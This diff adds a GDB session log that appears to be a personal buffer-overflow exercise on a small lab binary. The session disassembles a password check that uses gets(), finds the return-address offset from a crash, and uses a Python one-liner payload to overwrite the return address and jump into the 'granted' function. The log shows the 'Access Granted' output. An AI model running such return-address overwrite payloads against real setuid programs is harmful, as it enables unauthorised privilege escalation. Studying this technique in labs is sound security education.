@@ -1,0 +1,293 @@
+gdb vuln
+GNU gdb (Debian 13.2-1) 13.2
+Copyright (C) 2023 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from vuln...
+(No debugging symbols found in vuln)
+(gdb) list
+No symbol table is loaded.  Use the "file" command.
+(gdb) b main
+Breakpoint 1 at 0x128c
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0000127c <+0>:     lea    0x4(%esp),%ecx
+   0x00001280 <+4>:     and    $0xfffffff0,%esp
+   0x00001283 <+7>:     push   -0x4(%ecx)
+   0x00001286 <+10>:    push   %ebp
+   0x00001287 <+11>:    mov    %esp,%ebp
+   0x00001289 <+13>:    push   %esi
+   0x0000128a <+14>:    push   %ebx
+   0x0000128b <+15>:    push   %ecx
+   0x0000128c <+16>:    sub    $0xc,%esp
+   0x0000128f <+19>:    call   0x10e0 <__x86.get_pc_thunk.bx>
+   0x00001294 <+24>:    add    $0x2d60,%ebx
+   0x0000129a <+30>:    mov    %ecx,%esi
+   0x0000129c <+32>:    sub    $0xc,%esp
+   0x0000129f <+35>:    push   $0x3e8
+   0x000012a4 <+40>:    call   0x1090 <setuid@plt>
+   0x000012a9 <+45>:    add    $0x10,%esp
+   0x000012ac <+48>:    cmpl   $0x1,(%esi)
+   0x000012af <+51>:    jle    0x12cd <main+81>
+   0x000012b1 <+53>:    sub    $0xc,%esp
+   0x000012b4 <+56>:    lea    -0x1fb0(%ebx),%eax
+   0x000012ba <+62>:    push   %eax
+   0x000012bb <+63>:    call   0x1070 <puts@plt>
+   0x000012c0 <+68>:    add    $0x10,%esp
+   0x000012c3 <+71>:    sub    $0xc,%esp
+   0x000012c6 <+74>:    push   $0x1
+   0x000012c8 <+76>:    call   0x1080 <exit@plt>
+   0x000012cd <+81>:    call   0x11dd <checkpw>
+   0x000012d2 <+86>:    mov    $0x0,%eax
+--Type <RET> for more, q to quit, c to continue without paging--
+   0x000012d7 <+91>:    lea    -0xc(%ebp),%esp
+   0x000012da <+94>:    pop    %ecx
+   0x000012db <+95>:    pop    %ebx
+   0x000012dc <+96>:    pop    %esi
+   0x000012dd <+97>:    pop    %ebp
+   0x000012de <+98>:    lea    -0x4(%ecx),%esp
+   0x000012e1 <+101>:   ret
+End of assembler dump.
+(gdb) disas checkpw
+Dump of assembler code for function checkpw:
+   0x000011dd <+0>:     push   %ebp
+   0x000011de <+1>:     mov    %esp,%ebp
+   0x000011e0 <+3>:     push   %ebx
+   0x000011e1 <+4>:     sub    $0x74,%esp
+   0x000011e4 <+7>:     call   0x10e0 <__x86.get_pc_thunk.bx>
+   0x000011e9 <+12>:    add    $0x2e0b,%ebx
+   0x000011ef <+18>:    sub    $0xc,%esp
+   0x000011f2 <+21>:    lea    -0x1fec(%ebx),%eax
+   0x000011f8 <+27>:    push   %eax
+   0x000011f9 <+28>:    call   0x1050 <printf@plt>
+   0x000011fe <+33>:    add    $0x10,%esp
+   0x00001201 <+36>:    sub    $0xc,%esp
+   0x00001204 <+39>:    lea    -0x6c(%ebp),%eax
+   0x00001207 <+42>:    push   %eax
+   0x00001208 <+43>:    call   0x1060 <gets@plt>
+   0x0000120d <+48>:    add    $0x10,%esp
+   0x00001210 <+51>:    sub    $0x8,%esp
+   0x00001213 <+54>:    lea    -0x1fd6(%ebx),%eax
+   0x00001219 <+60>:    push   %eax
+   0x0000121a <+61>:    lea    -0x6c(%ebp),%eax
+   0x0000121d <+64>:    push   %eax
+   0x0000121e <+65>:    call   0x1030 <strcmp@plt>
+   0x00001223 <+70>:    add    $0x10,%esp
+   0x00001226 <+73>:    test   %eax,%eax
+   0x00001228 <+75>:    jne    0x1231 <checkpw+84>
+   0x0000122a <+77>:    call   0x124d <granted>
+   0x0000122f <+82>:    jmp    0x1243 <checkpw+102>
+   0x00001231 <+84>:    sub    $0xc,%esp
+   0x00001234 <+87>:    lea    -0x1fcd(%ebx),%eax
+   0x0000123a <+93>:    push   %eax
+   0x0000123b <+94>:    call   0x1070 <puts@plt>
+   0x00001240 <+99>:    add    $0x10,%esp
+   0x00001243 <+102>:   mov    $0x0,%eax
+   0x00001248 <+107>:   mov    -0x4(%ebp),%ebx
+   0x0000124b <+110>:   leave
+   0x0000124c <+111>:   ret
+End of assembler dump.
+(gdb) sh
+sharedlibrary  shell          show
+(gdb) printf "%x" , 0x6c
+6c(gdb) shell python -c 'print(0x6c)'
+108
+(gdb) run < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4)')
+
+Starting program: /home/pmihsan/gdb/buffer-overflow/vuln < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x5655628c in main ()
+(gdb) info registers
+eax            0x5655627c          1448436348
+ecx            0xffffd310          -11504
+edx            0xffffd330          -11472
+ebx            0xf7f9aff4          -134631436
+esp            0xffffd2ec          0xffffd2ec
+ebp            0xffffd2f8          0xffffd2f8
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x5655628c          0x5655628c <main+16>
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+k0             0x0                 0
+k1             0x0                 0
+k2             0x0                 0
+k3             0x0                 0
+k4             0x0                 0
+k5             0x0                 0
+k6             0x0                 0
+k7             0x0                 0
+(gdb) x/8w $edx
+0xffffd330:     -134631436      1448447724      -134231168      0
+0xffffd340:     -469908457      -1468051961     0       0
+(gdb) x/8w $esi
+0x56558eec:     1448436096      1       85      12
+0x56558efc:     4096    13      4840    25
+(gdb) x/8w $edi
+0xf7ffcb80:     0       -134285990      4       4096
+0xf7ffcb90:     3632    0       -134473840      3
+(gdb) x/8w $ebp
+0xffffd2f8:     0       -136703339      0       112
+0xffffd308:     -134230028      -136703339      1       -11324
+(gdb) run < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/pmihsan/gdb/buffer-overflow/vuln < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x5655628c in main ()
+(gdb) info registers
+eax            0x5655627c          1448436348
+ecx            0xffffd310          -11504
+edx            0xffffd330          -11472
+ebx            0xf7f9aff4          -134631436
+esp            0xffffd2ec          0xffffd2ec
+ebp            0xffffd2f8          0xffffd2f8
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x5655628c          0x5655628c <main+16>
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+k0             0x0                 0
+k1             0x0                 0
+k2             0x0                 0
+k3             0x0                 0
+k4             0x0                 0
+k5             0x0                 0
+k6             0x0                 0
+k7             0x0                 0
+(gdb) c
+Continuing.
+Enter your password: Access Denied
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x5655627c <+0>:     lea    0x4(%esp),%ecx
+   0x56556280 <+4>:     and    $0xfffffff0,%esp
+   0x56556283 <+7>:     push   -0x4(%ecx)
+   0x56556286 <+10>:    push   %ebp
+   0x56556287 <+11>:    mov    %esp,%ebp
+   0x56556289 <+13>:    push   %esi
+   0x5655628a <+14>:    push   %ebx
+   0x5655628b <+15>:    push   %ecx
+   0x5655628c <+16>:    sub    $0xc,%esp
+   0x5655628f <+19>:    call   0x565560e0 <__x86.get_pc_thunk.bx>
+   0x56556294 <+24>:    add    $0x2d60,%ebx
+   0x5655629a <+30>:    mov    %ecx,%esi
+   0x5655629c <+32>:    sub    $0xc,%esp
+   0x5655629f <+35>:    push   $0x3e8
+   0x565562a4 <+40>:    call   0x56556090 <setuid@plt>
+   0x565562a9 <+45>:    add    $0x10,%esp
+   0x565562ac <+48>:    cmpl   $0x1,(%esi)
+   0x565562af <+51>:    jle    0x565562cd <main+81>
+   0x565562b1 <+53>:    sub    $0xc,%esp
+   0x565562b4 <+56>:    lea    -0x1fb0(%ebx),%eax
+   0x565562ba <+62>:    push   %eax
+   0x565562bb <+63>:    call   0x56556070 <puts@plt>
+   0x565562c0 <+68>:    add    $0x10,%esp
+   0x565562c3 <+71>:    sub    $0xc,%esp
+   0x565562c6 <+74>:    push   $0x1
+   0x565562c8 <+76>:    call   0x56556080 <exit@plt>
+   0x565562cd <+81>:    call   0x565561dd <checkpw>
+   0x565562d2 <+86>:    mov    $0x0,%eax
+   0x565562d7 <+91>:    lea    -0xc(%ebp),%esp
+   0x565562da <+94>:    pop    %ecx
+   0x565562db <+95>:    pop    %ebx
+   0x565562dc <+96>:    pop    %esi
+   0x565562dd <+97>:    pop    %ebp
+   0x565562de <+98>:    lea    -0x4(%ecx),%esp
+   0x565562e1 <+101>:   ret
+End of assembler dump.
+(gdb) disas checkpw
+Dump of assembler code for function checkpw:
+   0x565561dd <+0>:     push   %ebp
+   0x565561de <+1>:     mov    %esp,%ebp
+   0x565561e0 <+3>:     push   %ebx
+   0x565561e1 <+4>:     sub    $0x74,%esp
+   0x565561e4 <+7>:     call   0x565560e0 <__x86.get_pc_thunk.bx>
+   0x565561e9 <+12>:    add    $0x2e0b,%ebx
+   0x565561ef <+18>:    sub    $0xc,%esp
+   0x565561f2 <+21>:    lea    -0x1fec(%ebx),%eax
+   0x565561f8 <+27>:    push   %eax
+   0x565561f9 <+28>:    call   0x56556050 <printf@plt>
+   0x565561fe <+33>:    add    $0x10,%esp
+   0x56556201 <+36>:    sub    $0xc,%esp
+   0x56556204 <+39>:    lea    -0x6c(%ebp),%eax
+   0x56556207 <+42>:    push   %eax
+   0x56556208 <+43>:    call   0x56556060 <gets@plt>
+   0x5655620d <+48>:    add    $0x10,%esp
+   0x56556210 <+51>:    sub    $0x8,%esp
+   0x56556213 <+54>:    lea    -0x1fd6(%ebx),%eax
+   0x56556219 <+60>:    push   %eax
+   0x5655621a <+61>:    lea    -0x6c(%ebp),%eax
+   0x5655621d <+64>:    push   %eax
+   0x5655621e <+65>:    call   0x56556030 <strcmp@plt>
+   0x56556223 <+70>:    add    $0x10,%esp
+   0x56556226 <+73>:    test   %eax,%eax
+   0x56556228 <+75>:    jne    0x56556231 <checkpw+84>
+   0x5655622a <+77>:    call   0x5655624d <granted>
+   0x5655622f <+82>:    jmp    0x56556243 <checkpw+102>
+   0x56556231 <+84>:    sub    $0xc,%esp
+   0x56556234 <+87>:    lea    -0x1fcd(%ebx),%eax
+   0x5655623a <+93>:    push   %eax
+   0x5655623b <+94>:    call   0x56556070 <puts@plt>
+   0x56556240 <+99>:    add    $0x10,%esp
+   0x56556243 <+102>:   mov    $0x0,%eax
+   0x56556248 <+107>:   mov    -0x4(%ebp),%ebx
+   0x5655624b <+110>:   leave
+   0x5655624c <+111>:   ret
+End of assembler dump.
+(gdb) run < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "\x4d\x62\x55\x56"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/pmihsan/gdb/buffer-overflow/vuln < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "\x4d\x62\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x5655628c in main ()
+(gdb)   File "<string>", line 1
+    print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "\x4d\x62\x55\x56"
+         ^
+SyntaxError: '(' was never closed
+
+(gdb) run < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "\x4d\x62\x55\x56")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/pmihsan/gdb/buffer-overflow/vuln < <(python -c 'print("A" * 100 + "B" * 4 + "C" * 4 + "D" * 4 + "\x4d\x62\x55\x56")')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x5655628c in main ()
+(gdb) c
+Continuing.
+Enter your password: Access Denied
+Access Granted
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd300 in ?? ()
